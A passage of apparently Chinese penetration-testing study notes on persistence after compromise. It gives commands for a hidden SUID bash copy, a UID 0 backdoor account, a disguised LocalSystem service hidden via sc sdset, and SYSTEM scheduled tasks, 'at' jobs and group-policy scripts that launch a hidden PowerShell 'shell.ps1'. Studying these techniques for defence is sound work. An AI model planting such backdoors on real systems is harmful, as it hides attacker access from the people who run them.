title="1、找到bash文件"></a>1、找到bash文件</h2><pre class="line-numbers language-none"><code class="language-none">whereis bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image003.gif" alt="img"></p><p>因为我是centos所以在<code>/usr/bin/bash</code></p><h2 id="2、复制到普通用户环境能接触的文件夹"><a href="#2、复制到普通用户环境能接触的文件夹" class="headerlink" title="2、复制到普通用户环境能接触的文件夹"></a>2、复制到普通用户环境能接触的文件夹</h2><pre class="line-numbers language-none"><code class="language-none">cp /bin/bash /tmp/.bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image004.jpg" alt="img"></p><h2 id="3、设置权限"><a href="#3、设置权限" class="headerlink" title="3、设置权限"></a>3、设置权限</h2><pre class="line-numbers language-none"><code class="language-none">chmod 4755 /tmp/.bash 后者 chmod +s /tmp/.bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image005-168396076560951.jpg" alt="img"></p><h2 id="4、创建一个普通用户jack"><a href="#4、创建一个普通用户jack" class="headerlink" title="4、创建一个普通用户jack"></a>4、创建一个普通用户jack</h2><pre class="line-numbers language-none"><code class="language-none">useradd -p `openssl passwd  -1 -salt 'salt '  123456` jack  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image006-168396076560952.jpg" alt="img"></p><h2 id="5、使用jack用户登录"><a href="#5、使用jack用户登录" class="headerlink" title="5、使用jack用户登录"></a>5、使用jack用户登录</h2><p><img src="assets/clip_image007-168396076560953.jpg" alt="img"></p><h3 id="6、运行-x2F-tmp-x2F-bash"><a href="#6、运行-x2F-tmp-x2F-bash" class="headerlink" title="6、运行/tmp/.bash"></a>6、运行/tmp/.bash</h3><pre class="line-numbers language-none"><code class="language-none">/tmp/.bash -p  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image009-168396076560954.gif" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/6.linux-quan-xian-wei-chi-te-quan-zhang-hao/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/6.linux-quan-xian-wei-chi-te-quan-zhang-hao/</url>
      
        <content type="html"><![CDATA[<h1 id="特权用户维持"><a href="#特权用户维持" class="headerlink" title="特权用户维持"></a>特权用户维持</h1><h2 id="用户文件介绍"><a href="#用户文件介绍" class="headerlink" title="用户文件介绍"></a>用户文件介绍</h2><p>在Linux系统中,存在着两个特殊的文件 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 这两个文件中存储着用户名和加密后的密码. 在目前大多数Linux系统中,将加密后的用户密码存放在/etc/shadow中但是 <code>/etc/shadow</code> 只能root用户查看</p><h2 id="一、-x2F-etc-x2F-passwd-介绍"><a href="#一、-x2F-etc-x2F-passwd-介绍" class="headerlink" title="一、**/etc/passwd**介绍"></a>一、**/etc/passwd**介绍</h2><pre class="line-numbers language-none"><code class="language-none">用户名： 密码： UID  (用户ID) ： GID (组ID) ： 描述性信息： 主目录： 默认Shell  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image009-168395996892236.jpg" alt="img"></p><h3 id="1-用户名"><a href="#1-用户名" class="headerlink" title="( 1) 用户名"></a>( 1) 用户名</h3><p>用户名， 就是一串代表用户身份的字符串， 用户名仅是为了方便用户记忆， Linux 系统是通过 UID 来识别用户身 份， 分配用户权限的。/etc/passwd 文件中就定义了用户名和 UID 之间的对应关系。</p><h3 id="2-密码"><a href="#2-密码" class="headerlink" title="( 2) 密码"></a>( 2) 密码</h3><p>“x” 表示此用户设有密码， 但不是真正的密码， 真正的密码保存在 <code>/etc/shadow</code> 文件中， 在早期的 UNIX 中， 这里 保存的就是真正的加密密码串， 但由于所有程序都能读取此文件， 非常容易造成用户数据被窃取。虽然密码是加密 的， 但是采用暴力破解的方式也是能够进行破解的。 因此， 现在 Linux 系统把真正的加密密码串放置在</p><p>/etc/shadow 文件中， 此文件只有 root 用户可以浏览和操作， 这样就最大限度地保证了密码的安全。</p><h3 id="3-UID"><a href="#3-UID" class="headerlink" title="( 3) UID"></a>( 3) UID</h3><p>UID， 也就是用户 ID。每个用户都有唯一的一个 UID， Linux 系统通过 UID 来识别不同的用户。实际上， UID 就是 一个 0~65535 之间的数， 不同范围的数字表示不同的用户身份</p><table><thead><tr><th><strong>UID</strong>范围</th><th>用户身份</th></tr></thead><tbody><tr><td>0</td><td>超级用户。 UID 为 0 就代表这个账号是管理员账号。在 Linux 中， 如何把普通用户升级成管 理员呢？ 只需把其他用户的  UID 修改为 0 就可以了， 这一点和  Windows 是不同的。不过不 建议建立多个管理员账号。</td></tr><tr><td>1~1000</td><td>系统用户 (伪用户) 。也就是说， 此范围的 UID 保留给系统使用。其中， 1<del>99 用于系统自  行创建的账号； 100</del>499 分配给有系统账号需求的用户。其实， 除了 0 之外， 其他的 UID 并无不同， 这里只是默认 500 以下的数字给系统作为保留账户， 只是一个公认的习惯而    已。</td></tr><tr><td>1000~65535</td><td>普通用户。通常这些 UID 已经足够用户使用了。但不够用也没关系， 2.6.x 内核之后的 Linux 系统已经可以支持 232 个 UID 了。</td></tr></tbody></table><h3 id="4-GID"><a href="#4-GID" class="headerlink" title="(4) GID"></a>(4) GID</h3><p>全称“Group ID”， 简称“组ID”， 表示用户初始组的组 ID 号。在建立用户jack 的同时， 就会建立jack 组作为jack 用 户的初始组。刚刚的 jack 用户除属于初始组 jack 外， 我又把它加入了 bob 组， 那么jack 用户同时属于 jack 组和 bob 组， 其中 jack是初始组， bob 是附加组。</p><h3 id="5-描述性信息"><a href="#5-描述性信息" class="headerlink" title="( 5) 描述性信息"></a>( 5) 描述性信息</h3><p>这个字段并没有什么重要的用途， 只是用来解释这个用户的意义而已。</p><h3 id="6-主目录"><a href="#6-主目录" class="headerlink" title="( 6) 主目录"></a>( 6) 主目录</h3><p>也就是用户登录后有操作权限的访问目录， 通常称为用户的主目录。</p><h3 id="7-默认的Shell"><a href="#7-默认的Shell" class="headerlink" title="( 7) 默认的Shell"></a>( 7) 默认的Shell</h3><p>Shell 就是 Linux 的命令解释器，  是用户和 Linux 内核之间沟通的桥梁。 linux 系统默认使用的命令解释器是 bash (/bin/bash)</p><h2 id="二、-x2F-etc-x2F-shadow-介绍"><a href="#二、-x2F-etc-x2F-shadow-介绍" class="headerlink" title="二、**/etc/shadow**介绍"></a>二、**/etc/shadow**介绍</h2><p>/etc/shadow 文件， 用于存储 Linux 系统中用户的密码信息， 又称为“影子文件”。前面介绍了 /etc/passwd 文件 ， 由于该文件允许所有用户读取， 易导致用户密码泄露， 因此 Linux 系统将用户的密码信息从 /etc/passwd 文件中分 离出来， 并单独放到了此文件中。/etc/shadow 文件<strong>只有 root 用户拥有读权限</strong>， 其他用户没有任何权限， 这样就 保证了用户密码的安全性。</p><pre class="line-numbers language-none"><code class="language-none">用户名： 加密密码： 最后一次修改时间： 最小修改时间间隔： 密码有效期： 密码需要变更前的警告天数： 密码过期后的宽限时间： 账号失效时间： 保留字段  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image010-168395996892337.jpg" alt="img"></p><h3 id="1-用户名-1"><a href="#1-用户名-1" class="headerlink" title="( 1) 用户名"></a>( 1) 用户名</h3><p>同 /etc/passwd 文件的用户名有相同的含义。</p><h3 id="2-加密密码"><a href="#2-加密密码" class="headerlink" title="( 2) 加密密码"></a>( 2) 加密密码</h3><p>这里保存的是真正加密的密码。 目前 Linux 的密码采用的是 SHA512 散列加密算法， 原来采用的是 MD5 或 DES 加密算法。SHA512 散列加密算法的加密等级更高， 也更加安全。  注意， 这串密码产生的乱码不能手 工修改， 如果手工修改， 系统将无法识别密码， 导致密码失效。很多软件透过这个功能， 在密码串前加上 “!”、””  或 “x” 使密码暂时失效。  所有伪用户的密码都是 “!!” 或””，  代表没有密码是不能登录的。当然， 新创建的用户如果 不设定密码， 那么它的密码项也是 “!!”， 代表这个用户没有密码， 不能登录。</p><h3 id="3-最后一次修改时间"><a href="#3-最后一次修改时间" class="headerlink" title="( 3) 最后一次修改时间"></a>( 3) 最后一次修改时间</h3><p>此字段表示最后一次修改密码的时间， 可是， 为什么 root 用户显示的是 15775 呢？ 这是 因为， Linux 计算日期的时间是以 1970 年 1 月 1 日作为 1 不断累加得到的时间， 到 1971 年 1 月 1 日， 则为 366 天。这里显示 15775 天， 也就是说， 此 root 账号在 1970 年 1 月 1 日之后的第 15775 天修改的 root 用户密码。</p><h3 id="4-最小修改时间间隔"><a href="#4-最小修改时间间隔" class="headerlink" title="(4) 最小修改时间间隔"></a>(4) 最小修改时间间隔</h3><p>最小修改间隔时间， 也就是说， 该字段规定了从第 3 字段 (最后一次修改密码的日期)   起， 多长时间之内不能修改密码。如果是 0， 则密码可以随时修改； 如果是 10， 则代表密码修改后 10 天之内不能 再次修改密码。此字段是为了针对某些人频繁更改账户密码而设计的。</p><h3 id="5-密码有效期"><a href="#5-密码有效期" class="headerlink" title="( 5) 密码有效期"></a>( 5) 密码有效期</h3><p>经常变更密码是个好习惯， 为了强制要求用户变更密码， 这个字段可以指定距离第 3 字段 (最后 一次更改密码) 多长时间内需要再次变更密码， 否则该账户密码进行过期阶段。该字段的默认值为 99999， 也就是 273 年， 可认为是永久生效。如果改为 90， 则表示密码被修改 90 天之后必须再次修改， 否则该用户即将过期。管 理服务器时， 通过这个字段强制用户定期修改密码。</p><h3 id="6-密码需要变更前的警告天数"><a href="#6-密码需要变更前的警告天数" class="headerlink" title="( 6) 密码需要变更前的警告天数"></a>( 6) 密码需要变更前的警告天数</h3><p>与第 5 字段相比较， 当账户密码有效期快到时， 系统会发出警告信息给此账户 ， 提醒用户 “再过 n 天你的密码就要过期了， 请尽快重新设置你的密码！ “。该字段的默认值是 7， 也就是说， 距离密 码有效期的第 7 天开始， 每次登录系统都会向该账户发出 “修改密码” 的警告信息。</p><h3 id="7-密码过期后的宽限天数"><a href="#7-密码过期后的宽限天数" class="headerlink" title="( 7) 密码过期后的宽限天数"></a>( 7) 密码过期后的宽限天数</h3><p>也称为“口令失效日”， 简单理解就是， 在密码过期后， 用户如果还是没有修改密码， 则在此字段规定的宽限天数 内， 用户还是可以登录系统的； 如果过了宽限天数， 系统将不再让此账户登陆， 也不会提示账户过期， 是完全禁 用。比如说， 此字段规定的宽限天数是 10， 则代表密码过期 10 天后失效； 如果是 0， 则代表密码过期后立即失 效； 如果是 -1， 则代表密码永远不会失效。</p><h3 id="8-账号失效时间"><a href="#8-账号失效时间" class="headerlink" title="( 8) 账号失效时间"></a>( 8) 账号失效时间</h3><p>同第 3 个字段一样， 使用自 1970 年 1 月 1 日以来的总天数作为账户的失效时间。该字段表示， 账号在此字段规定 的时间之外， 不论你的密码是否过期， 都将无法使用！ 该字段通常被使用在具有收费服务的系统中。</p><h3 id="9-保留字段"><a href="#9-保留字段" class="headerlink" title="( 9) 保留字段"></a>( 9) 保留字段</h3><p>这个字段目前没有使用， 等待新功能的加入。</p><h1 id="添加特权用户"><a href="#添加特权用户" class="headerlink" title="添加特权用户"></a>添加特权用户</h1><p>田间特权用户及时添加的用户和root拥有相同的权限， 也就是在添加用户的时候将 UID更改为0， </p><p>使用<code>useradd</code>命 令创建用户</p><pre class="line-numbers language-none"><code class="language-none">用法：useradd [选项] 登录 useradd -D useradd -D [选项]选项：-b, --base-dir BASE_DIR 新账户的主目录的基目录-c, --comment COMMENT 新账户的 GECOS 字段-d, --home-dir HOME_DIR 新账户的主目录-D, --defaults 显示或更改默认的 useradd 配置-e, --expiredate EXPIRE_DATE 新账户的过期日期-f, --inactive INACTIVE 新账户的密码不活动期-g, --gid GROUP 新账户主组的名称或 ID-G, --groups GROUPS 新账户的附加组列表-h, --help 显示此帮助信息并推出-k, --skel SKEL_DIR 使用此目录作为骨架目录-K, --key KEY=VALUE 不使用 /etc/login.defs 中的默认值-l, --no-log-init 不要将此用户添加到最近登录和登录失败数据库-m, --create-home 创建用户的主目录-M, --no-create-home 不创建用户的主目录-N, --no-user-group 不创建同名的组-o, --non-unique 允许使用重复的 UID 创建用户-p, --password PASSWORD 加密后的新账户密码-r, --system 创建一个系统账户-R, --root CHROOT_DIR chroot 到的目录-s, --shell SHELL 新账户的登录 shell-u, --uid UID 新账户的用户 ID-U, --user-group 创建与用户同名的组-Z, --selinux-user SEUSER 为 SELinux 用户映射使用指定 SEUSER<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加普通用户"><a href="#添加普通用户" class="headerlink" title="添加普通用户"></a>添加普通用户</h2><pre class="line-numbers language-none"><code class="language-none"># 创建一个用户名guest，密码123456的普通用户useradd -p `openssl passwd -1 -salt 'salt' 123456` guest# useradd -p 方法 ` ` 是用来存放可执行的系统命令,"$()"也可以存放命令执行语句useradd -p "$(openssl passwd -1 123456)" guest# chpasswd方法useradd guest;echo 'guest:123456'|chpasswd# echo -e方法useradd test;echo -e "123456\n123456\n" |passwd test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加超级用户"><a href="#添加超级用户" class="headerlink" title="添加超级用户"></a>添加超级用户</h2><pre class="line-numbers language-none"><code class="language-none"># 创建一个用户名guest，密码123456的root用户useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s/bin/bash -d /home/test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/clip_image012-168395996892338.gif" alt="img"></p><p><img src="assets/clip_image013-168395996892339.jpg" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/5.windows-quan-xian-wei-chi-xi-tong-fu-wu/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/5.windows-quan-xian-wei-chi-xi-tong-fu-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="服务介绍"><a href="#服务介绍" class="headerlink" title="服务介绍"></a>服务介绍</h1><p>服务 (即， 以前的 NT 服务) 使您能够创建在它们自己的 Windows 会话中可长时间运行的可执行应用程序。这些 服务可以在计算机启动时自动启动， 可以暂停和重新启动而且不显示任何用户界面。这种服务非常适合在服务器上 使用， 或任何时候， 为了不影响在同一台计算机上工作的其他用户， 需要长时间运行功能时使用。还可以在不同于 登录用户的特定用户帐户或默认计算机帐户的安全上下文中运行服务。</p><p>输入 <code>SC/?</code> 出现以下提示</p><pre class="line-numbers language-none"><code class="language-none">描述: SC 是用来与服务控制管理器和服务进行通信的命令行程序。用法 : sc &lt;server&gt; [command] [service name] &lt;option1&gt; &lt;option2&gt;...命令:query-----------查询服务的状态，  或枚举服务类型的状态。queryex---------查询服务的扩展状态，  或枚举服务类型的状态。start-----------启动服务。pause-----------向服务发送  PAUSE 控制请求。interrogate-----向服务发送  INTERROGATE 控制请求。continue--------向服务发送  CONTINUE 控制请求。stop------------向服务发送  STOP 请求。config----------更改服务的配置(永久)。description-----更改服务的描述。failure---------更改失败时服务执行的操作。failureflag-----更改服务的失败操作标志。sidtype---------更改服务的服务  SID 类型。privs-----------更改服务的所需特权。managedaccount--更改服务以将服务帐户密码标记为由  LSA 管理。qc--------------查询服务的配置信息。qdescription----查询服务的描述。qfailure--------查询失败时服务执行的操作。qfailureflag----查询服务的失败操作标志。qsidtype--------查询服务的服务  SID 类型。qprivs----------查询服务的所需特权。qtriggerinfo----查询服务的触发器参数。qpreferrednode--查询服务的首选  NUMA 节点。qmanagedaccount-查询服务是否将帐户与  LSA 管理的密码结合使用。qprotection-----查询服务的进程保护级别。quserservice----查询用户服务模板的本地实例。delete ----------(从注册表中)删除服务。create----------创建服务(并将其添加到注册表中)。control---------向服务发送控制。sdshow----------显示服务的安全描述符。sdset-----------设置服务的安全描述符。showsid---------显示与任意名称对应的服务  SID 字符串。triggerinfo-----配置服务的触发器参数。preferrednode---设置服务的首选  NUMA 节点。GetDisplayName--获取服务的  DisplayName。GetKeyName------获取服务的  ServiceKeyName。EnumDepend------枚举服务依赖关系。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为我们使用的是create。所以输入 <code>sc create</code><img src="assets/clip_image008-168395960828320.gif" alt="img">得到以下提示</p><pre class="line-numbers language-none"><code class="language-none">描述: 在注册表和服务数据库中创建服务项。用法: sc &lt;server&gt; create [service name] [binPath= ] &lt;option1&gt; &lt;option2&gt;...注意: 选项名称包括等号。等号和值之间需要一个空格。选项:在注册表和服务数据库中创建服务项。sc &lt;server&gt; create [service name] [binPath= ] &lt;option1&gt; &lt;option2&gt;... 选项名称包括等号。等号和值之间需要一个空格。type= &lt;own|share|interact|kernel|filesys|rec|userown|usershare&gt;(默认  = own) start= &lt;boot|system|auto|demand|disabled|delayed-auto&gt;(默认  = demand)      error= &lt;normal|severe|critical|ignore&gt;(默认  = normal)binPath= &lt;.exe 文件的  BinaryPathName&gt;group= &lt;LoadOrderGroup&gt;tag= &lt;yes |no&gt;depend= &lt;依存关系(以  / (斜杠)分隔)&gt;obj= &lt;AccountName|ObjectName&gt;(默认= LocalSystem)DisplayName= &lt;显示名称&gt;password= &lt;密码&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="服务维持权限"><a href="#服务维持权限" class="headerlink" title="服务维持权限                                       "></a>服务维持权限                                      <a href="af://n13"> </a></h1><p>根据以上的提示信息我们来创建一个服务让他启动ps1脚本(注意空格)</p><pre class="line-numbers language-none"><code class="language-none">1、创建服务sc create shell start= auto binPath= "cmd.exe /k powershell.exe -w hidden -ExecutionPolicy Bypass -NoExit -File C:\Users\Administrator\Desktop\keep\shell.ps1" obj= Localsystem  2、对该服务进行伪装sc description "shell" "绝对安全的shell哈哈哈"3、设置服务的自动启动sc config "shell" start= auto4、然后启动该服务net start "服务名"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/clip_image010-168395960828321.gif" alt="img"></p><p>接下来去查看服务是否已经创建【<code>services.msc</code>】</p><p><img src="assets/clip_image011.jpg" alt="img"></p><p>接下来重启电脑看看能不能连接</p><p><img src="assets/clip_image013.gif" alt="img"></p><h1 id="隐藏服务"><a href="#隐藏服务" class="headerlink" title="隐藏服务                                           "></a>隐藏服务                                          <a href="af://n29"> </a></h1><p>这种创建服务的方法隐藏性太弱， 直接在服务里就能看到， 可以在创建完服务后， 使用以下命令将创建的服务隐 藏， 这样不论是在服务中， 还是使用命令都查不到这个服务。</p><pre class="line-numbers language-none"><code class="language-none">sc sdset shell "D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;; ;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image015.gif" alt="img"></p><p>使用以下的命令进行恢复</p><pre class="line-numbers language-none"><code class="language-none">sc sdset shell "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/4.windows-quan-xian-wei-chi-ji-hua-ren-wu/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/4.windows-quan-xian-wei-chi-ji-hua-ren-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="计划任务介绍"><a href="#计划任务介绍" class="headerlink" title="计划任务介绍"></a>计划任务介绍</h1><p>计划任务是系统的常见功能，  利用任务计划功能，  可以将任何脚本、程序或文档安排在某个最方便的时间运行。任 务计划在每次系统启动的时候启动并在后台运行。<br>计划任务打开方式</p><ol><li>【管理工具】—&gt;【任务计划程序】</li><li>【控制面板】—&gt;【计划任务】</li><li>【<code>taskschd.msc</code>】命令</li></ol><p><img src="assets/image-20230513150818356.png" alt="image-20230513150818356"></p><h1 id="计划任务生成方式"><a href="#计划任务生成方式" class="headerlink" title="计划任务生成方式"></a>计划任务生成方式</h1><h2 id="一、使用schtasks"><a href="#一、使用schtasks" class="headerlink" title="一、使用schtasks"></a>一、使用schtasks</h2><h3 id="1、schtasks命令使用介绍"><a href="#1、schtasks命令使用介绍" class="headerlink" title="1、schtasks命令使用介绍"></a>1、<code>schtasks</code>命令使用介绍</h3><p><code>schtasks /?</code></p><pre class="line-numbers language-none"><code class="language-none">SCHTASKS /parameter [arguments]描述:允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任务。参数列表:/Create 创建新计划任务。/Delete 删除计划任务。/Query 显示所有计划任务。/Change 更改计划任务属性。/Run 按需运行计划任务。/End 中止当前正在运行的计划任务。/ShowSid 显示与计划的任务名称相应的安全标识符。/? 显示此帮助消息。Examples: 产看具体详情SCHTASKSSCHTASKS /?SCHTASKS /Run /?SCHTASKS /End /?SCHTASKS /Create /?SCHTASKS /Delete /?SCHTASKS /Query /?SCHTASKS /Change /?SCHTASKS /ShowSid /?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们主要关注<code>SCHTASKS /Delete /?</code> 下的命令</p><h3 id="2、使用以下命令进行测试"><a href="#2、使用以下命令进行测试" class="headerlink" title="2、使用以下命令进行测试"></a>2、使用以下命令进行测试</h3><pre class="line-numbers language-none"><code class="language-none">1、在每个任意用户登录中以SYSTEM的形式执行计划任务：schtasks /create /tn 计划任务名 /tr "计划任务执行文件命令" /sc onlogon /ru System2、在系统启动期间或用户会话处于非活动状态（空闲模式）时执行schtasks /create /tn 计划任务名 /tr "计划任务执行文件命令" /sc onidle /i 303、在系统启动的时候以SYSTEM的形式执行计划任务：schtasks /create /tn 计划任务名 /tr "计划任务执行文件命令" /sc onstart /ru System4、计划任务以 System 权限每10分钟运行一次schtasks /create /tn 计划任务名 /tr "计划任务执行文件命令" /sc minute/mo 10 /ru system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、我们利用当系统开机的时候运行计划任务【实验请看】权限维持"><a href="#3、我们利用当系统开机的时候运行计划任务【实验请看】权限维持" class="headerlink" title="3、我们利用当系统开机的时候运行计划任务【实验请看】权限维持"></a>3、我们利用当系统开机的时候运行计划任务【实验请看】权限维持</h3><pre class="line-numbers language-none"><code class="language-none">schtasks /create /tn shell /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -ExecutionPolicy Bypass -NoExit -File C:\Users\Administrator\Desktop\keep\shell.ps1" /sc onstart /ru System<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4、查看连接情况"><a href="#4、查看连接情况" class="headerlink" title="4、查看连接情况"></a>4、查看连接情况</h3><pre class="line-numbers language-none"><code class="language-none">ps -ano<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="assets/image-20230513151231751.png" alt="image-20230513151231751"></p><h2 id="二、使用at"><a href="#二、使用at" class="headerlink" title="二、使用at"></a>二、使用at</h2><h3 id="2、命令详情如下"><a href="#2、命令详情如下" class="headerlink" title="2、命令详情如下"></a>2、命令详情如下</h3><pre class="line-numbers language-none"><code class="language-none">\\computername    指定远程计算机。如果省略这个参数，会计划在本地计算机上运行命令。id                指定给已计划命令的识别号。/delete           删除某个已计划的命令。如果省略 id，计算机上所有已计划的命令都会被删除。/yes              不需要进一步确认时，跟删除所有作业的命令一起使用。time              指定运行命令的时间。/interactive      允许作业在运行时，与当时登录的用户桌面进行交互。/every:date[,...] 指定在每周或每月的特定日期运行命令 如果省略日期，则默认为在每月的本日运行。/next:date[,...]  指定在下一个指定日期(如，下周四)运行命令。如果省略日期，则默认为在每月的本日运行。"command"         准备运行的 Windows NT 命令或批处理程序。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、简单命令如下"><a href="#3、简单命令如下" class="headerlink" title="3、简单命令如下"></a>3、简单命令如下</h3><pre class="line-numbers language-none"><code class="language-none">at 1:00AM /Every:Saturday 1.bat 在每个周六1:00点，电脑定时启动1，bat批处理文件。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4、编写一个命令进行权限维持"><a href="#4、编写一个命令进行权限维持" class="headerlink" title="4、编写一个命令进行权限维持"></a>4、编写一个命令进行权限维持</h3><p>bat脚本内容如下：</p><pre class="line-numbers language-none"><code class="language-none">@echo offpowershell.exe -w hidden -ExecutionPolicy Bypass -NoExit -File C:\Users\Administrator\Desktop\keep\shell.ps1exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">at 00:00  C:\Users\Administrator\Desktop\keep\1.bat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5、查看连接情况"><a href="#5、查看连接情况" class="headerlink" title="5、查看连接情况"></a>5、查看连接情况</h3><p><img src="assets/image-20230513151520050.png" alt="image-20230513151520050"></p><p><code>at 1 /delete</code> 删除任务</p><h2 id="三、使用powershell"><a href="#三、使用powershell" class="headerlink" title="三、使用powershell"></a>三、使用powershell</h2><p>【比较复杂有时间在搞定】</p><p>​</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/3.windows-quan-xian-wei-chi-qi-dong-xiang/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/3.windows-quan-xian-wei-chi-qi-dong-xiang/</url>
      
        <content type="html"><![CDATA[<h1 id="启动项目维持"><a href="#启动项目维持" class="headerlink" title="启动项目维持"></a>启动项目维持</h1><p>启动项目， 就是开机的时候系统会在前台或者后台运行的程序。当操作系统完成登录过程， 进程表中出现了很多的 进程。操作系统在启动的时候， 自动加载了很多程序。许多程序的自启动， 给我们带来了很多方便， 这是不争的事 实， 但不是每个自启动的程序对我们都有用； 更甚者， 也许有病毒或木马在自启动行列。</p><h2 id="组策略维持"><a href="#组策略维持" class="headerlink" title="组策略维持"></a>组策略维持</h2><h3 id="一、组策略介绍"><a href="#一、组策略介绍" class="headerlink" title="一、组策略介绍"></a>一、组策略介绍</h3><p>介绍： 组策略 (英语： Group Policy) 是微软Windows NT家族操作系统的一个特性， 它可以控制用户帐户和计算 机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。组策略的其中 一个版本名为本地组策略 (缩写“LGPO”或“LocalGPO”) ， 这可以在独立且非域的计算机上管理组策略对象。</p><p>原理： 在组策略中添加Payload， 利用组策略的自启动策略来加载Payload文件</p><h3 id="二、组策略所在位置"><a href="#二、组策略所在位置" class="headerlink" title="二、组策略所在位置"></a>二、组策略所在位置</h3><h4 id="1、在运行框中输入“gpedit-msc-”，-点击确定或者直接按键盘上的回车键，-打开组策略"><a href="#1、在运行框中输入“gpedit-msc-”，-点击确定或者直接按键盘上的回车键，-打开组策略" class="headerlink" title="1、在运行框中输入“gpedit.msc ”， 点击确定或者直接按键盘上的回车键， 打开组策略"></a>1、在运行框中输入“<code>gpedit.msc</code> ”， 点击确定或者直接按键盘上的回车键， 打开组策略</h4><p><img src="assets/clip_image001.jpg" alt="img"></p><h4 id="2、在【Windows设置】-gt-【脚本-启动-x2F-关机-】双击【启动】就可以进行设置"><a href="#2、在【Windows设置】-gt-【脚本-启动-x2F-关机-】双击【启动】就可以进行设置" class="headerlink" title="2、在【Windows设置】->【脚本(启动/关机)】双击【启动】就可以进行设置"></a>2、在【Windows设置】-&gt;【脚本(启动/关机)】双击【启动】就可以进行设置</h4><p><img src="assets/clip_image002.jpg" alt="img"></p><h4 id="3、选择要添加的脚本或者PowerShell"><a href="#3、选择要添加的脚本或者PowerShell" class="headerlink" 